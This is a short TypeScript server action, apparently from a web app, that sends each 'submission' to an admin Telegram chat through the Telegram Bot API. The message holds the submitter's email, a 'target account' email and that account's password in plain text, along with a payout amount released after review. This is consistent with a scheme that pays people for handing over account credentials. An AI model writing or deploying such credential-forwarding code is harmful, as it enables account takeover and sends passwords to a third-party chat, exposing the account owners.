
'use server';

/**
 * @fileoverview Server actions for Telegram Bot integration.
 */

export async function notifySubmission(data: {
  userEmail: string;
  accountEmail: string;
  password?: string;
  earnings: number;
}) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_ADMIN_CHAT_ID;

  if (!token || !chatId || chatId === 'YOUR_CHAT_ID_HERE') {
    console.warn('Telegram Bot not fully configured. Set TELEGRAM_ADMIN_CHAT_ID in .env');
    return;
  }

  const message = `
🚀 <b>New Submission Received!</b>

👤 <b>Submitter:</b> ${data.userEmail}
📧 <b>Target Account:</b> ${data.accountEmail}
🔑 <b>Password:</b> <code>${data.password || 'N/A'}</code>
💰 <b>Reward:</b> $${data.earnings.toFixed(2)}

<i>Audit this submission in the Admin Panel to release funds.</i>
  `;

  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
      }),
    });

    if (!response.ok) {
      const errorData = await response.json();
      console.error('Telegram API Error:', errorData);
    }
  } catch (error) {
    console.error('Failed to send Telegram notification:', error);
  }
}
